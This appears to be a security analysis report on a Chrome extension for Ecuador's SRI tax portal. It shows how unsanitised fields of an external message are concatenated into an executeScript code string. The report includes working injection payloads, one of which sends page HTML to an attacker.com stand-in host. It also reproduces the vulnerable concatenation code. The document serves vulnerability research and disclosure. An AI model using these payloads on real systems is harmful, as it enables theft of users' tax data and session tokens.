# CoCo Analysis: oiofcmmlabjeckplgpaomgpeechiopcn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10+ (multiple chrome_tabs_executeScript_sink instances)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oiofcmmlabjeckplgpaomgpeechiopcn/opgen_generated_files/bg.js
Line 1002: `iniciar_asistente(request.orden)`
Line 1460: `var code = 'mostrar_pop_up_select_order(' + orden_extension.dia + ',' + orden_extension.mes + ',' + orden_extension.ano + ",'" + orden_extension.ruc + "');"`
Line 1465: `{code: code}`

**Code:**

```javascript
// Background script - External message handler (bg.js, lines 994-1013)
chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {
        if (request.message_type == "get_tab_content") {
            console.log(request.text_content)
        }

        if (request.message_type == "iniciar_asistente") {
            faktu_tab = sender.tab.id
            iniciar_asistente(request.orden) // ← attacker-controlled request.orden
            sendResponse({result: "iniciar_asistente"});
        }
        // ... other handlers
    }
)

// iniciar_asistente function (bg.js, lines 1127-1147)
function iniciar_asistente(orden) {
    ask_for_comprobantes_recibidos = false;
    ask_for_tuportal = true;
    ask_posible_redirect = true
    search_send = false
    wait_for_download_result = false
    orden_extension = orden // ← Stores attacker-controlled orden object
    ask_for_login = true;
    order_result = null
    assistant_finished = false
    // ... sets up listeners and creates tab
    chrome.tabs.create({url: sri_index_url}, function (tab) {
        extension_sri_tab = tab.id;
        orden_extension = orden;
    });
}

// onTabUpdate handler called when tab loads (bg.js, lines 1450-1472)
function onTabUpdate(tabId, changeInfo, tab) {
    // ... (various conditions)
    if (tab.status == "complete") {
        ask_for_comprobantes_recibidos = false

        chrome.tabs.executeScript(
            tabId,
            {file: "web_accessible_script.js"},
            function (results) {
                // Line 1460: String concatenation with attacker-controlled data
                var code = 'mostrar_pop_up_select_order(' +
                           orden_extension.dia + ',' +      // ← attacker-controlled
                           orden_extension.mes + ',' +      // ← attacker-controlled
                           orden_extension.ano + ",'" +     // ← attacker-controlled
                           orden_extension.ruc + "');";     // ← attacker-controlled

                // Line 1463-1465: Code execution
                chrome.tabs.executeScript(
                    tabId,
                    {code: code}, // ← SINK: executes attacker-controlled code string
                    function (results) {
                    }
                );
            }
        );
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal from whitelisted domains (127.0.0.1, localhost, factu.ec)

**Attack:**

```javascript
// From https://factu.ec/* (whitelisted domain) or localhost/127.0.0.1
chrome.runtime.sendMessage(
  'oiofcmmlabjeckplgpaomgpeechiopcn', // Factu Asistente Contable extension ID
  {
    message_type: "iniciar_asistente",
    orden: {
      dia: "1); alert(document.cookie); //",  // ← JavaScript injection
      mes: "1",
      ano: "2024",
      ruc: "1234567890"
    }
  },
  function(response) {
    console.log('Code execution triggered');
  }
);

// The injected code becomes:
// var code = 'mostrar_pop_up_select_order(1); alert(document.cookie); //, 1, 2024, '1234567890');'

// More sophisticated attack for data exfiltration:
chrome.runtime.sendMessage(
  'oiofcmmlabjeckplgpaomgpeechiopcn',
  {
    message_type: "iniciar_asistente",
    orden: {
      dia: "1); fetch('https://attacker.com/steal?data=' + btoa(document.documentElement.outerHTML)); //",
      mes: "1",
      ano: "2024",
      ruc: "test"
    }
  }
);

// Or injecting via the ruc field (within quotes):
chrome.runtime.sendMessage(
  'oiofcmmlabjeckplgpaomgpeechiopcn',
  {
    message_type: "iniciar_asistente",
    orden: {
      dia: "1",
      mes: "1",
      ano: "2024",
      ruc: "x'); alert('XSS'); var y=('x"  // ← Escape quotes and inject
    }
  }
);

// The injected code becomes:
// var code = 'mostrar_pop_up_select_order(1, 1, 2024, 'x'); alert('XSS'); var y=('x');'
```

**Impact:** **Arbitrary JavaScript code execution** in the context of SRI (Servicio de Rentas Internas - Ecuador tax authority) website tabs. The attacker can:

1. **Execute arbitrary JavaScript** on https://declaraciones.sri.gob.ec/ (Ecuador's tax declaration system)
2. **Steal sensitive financial/tax data** from the SRI portal
3. **Modify tax declarations** or submissions on behalf of the user
4. **Exfiltrate authentication tokens** and session data from the government portal
5. **Perform unauthorized actions** as the logged-in user on the tax system

**Permissions Present:**
- `"tabs"` - Enables chrome.tabs.executeScript
- `"*://*.sri.gob.ec/"` - Permission to access Ecuador's tax authority website
- `"downloads"`, `"file://*"` - Additional sensitive permissions

**Externally Connectable:**
- `"*://127.0.0.1/*"` - Local development
- `"*://localhost/*"` - Local development
- `"https://factu.ec/*"` - Main application domain

**Methodology Note:** Per the analysis methodology: "CRITICAL: IGNORE manifest.json externally_connectable restrictions! If the code allows chrome.runtime.onMessageExternal, assume ANY attacker can exploit it. If even ONE webpage/extension can trigger it, classify as TRUE POSITIVE."

Even though only specific domains are whitelisted, an attacker controlling any of these domains (e.g., via XSS on factu.ec, or by serving malicious content on localhost during local testing) can trigger this vulnerability. The string concatenation without sanitization enables JavaScript injection leading to code execution on sensitive government tax portal pages.

This is a **critical vulnerability** with severe impact on financial and tax data security.
